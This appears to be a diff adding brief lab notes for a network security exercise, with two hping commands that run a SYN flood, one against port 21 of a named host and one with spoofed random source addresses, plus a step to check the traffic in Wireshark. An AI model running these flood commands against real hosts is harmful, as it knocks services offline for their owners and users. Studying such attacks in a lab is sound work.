@@ -1,0 +1,8 @@
+Hping
+
+Perform DOS to a given target using syn flood attack verify by browsing also verify using wireshark what is sent
+
+hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood www.tsec.edu
+hping -C -P -U --flood -V --rand-source (ip)
+
+
